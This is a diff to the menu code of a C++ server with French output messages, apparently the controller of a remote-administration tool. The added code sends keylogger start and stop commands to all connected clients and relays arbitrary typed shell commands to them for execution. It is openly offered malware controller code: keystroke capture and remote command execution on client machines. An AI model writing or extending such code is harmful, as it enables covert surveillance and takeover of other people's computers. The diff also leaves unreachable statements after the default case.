@@ -81,12 +81,30 @@ void Menu::handleChoice(int choice) {
             std::cout << "=======================================" << std::endl;
             break;
         }
-        case 4:
+        case 4: {
             std::cout << "Option 4 sélectionnée: Démarrer le keylogger" << std::endl;
+            // Send start command for keylogger
+            std::string cmdStart = "start";
+            std::vector<uint8_t> startPayload(cmdStart.begin(), cmdStart.end());
+            LPTF_Packet request(1, PacketType::KEYLOG, 0, 1, 1, startPayload);
+            for (const auto& client : clients) {
+                client->sendBinary(request.serialize());
+            }
+            std::cout << "Keylogger démarré sur le client." << std::endl;
             break;
-        case 5:
+        }
+        case 5: {
             std::cout << "Option 5 sélectionnée: Eteindre le keylogger" << std::endl;
+            // Send stop command for keylogger
+            std::string cmdStop = "stop";
+            std::vector<uint8_t> stopPayload(cmdStop.begin(), cmdStop.end());
+            LPTF_Packet stopRequest(1, PacketType::KEYLOG, 0, 1, 1, stopPayload);
+            for (const auto& client : clients) {
+                client->sendBinary(stopRequest.serialize());
+            }
+            std::cout << "Keylogger arrêté sur le client." << std::endl;
             break;
+        }
         case 6: {
             std::cout << "Processus sur le client:" << std::endl;
             if (!lister.listProcesses()) {
@@ -109,16 +127,40 @@ void Menu::handleChoice(int choice) {
             }
             break;
         }
-        case 8:
-            std::cout << "Option 8 sélectionnée: Exécuter une commande" << std::endl;
+        case 8: {
+            std::cout << "Commande à exécuter sur le client : ";
+            std::string command;
+            std::getline(std::cin, command);
+            if (command.empty()) {
+                std::cout << "Commande vide." << std::endl;
+                break;
+            }
+
+            std::vector<uint8_t> payload(command.begin(), command.end());
+            LPTF_Packet execPacket(1, PacketType::EXEC_COMMAND, 0, 1, 1, payload);
+
+            for (const auto& client : clients) {
+                client->sendBinary(execPacket.serialize());
+            }
+
+            std::cout << "Commande envoyée au client." << std::endl;
             break;
+        }
         case 9:
             std::cout << "Fermeture du serveur..." << std::endl;
             exit(0); // Exit the program
             break;
-        default:
-            std::cout << "Option invalide, veuillez réessayer." << std::endl;
+        default: {
+            // If cin has failed, clear the error and discard the bad input
+            if (!std::cin) {
+                std::cin.clear();
+                std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+            }
+            std::cout << "Entrée invalide, veuillez entrer un nombre valide." << std::endl;
             break;
+        }
+        std::cout << "Option invalide, veuillez réessayer." << std::endl;
+        break;
     }
 }
 
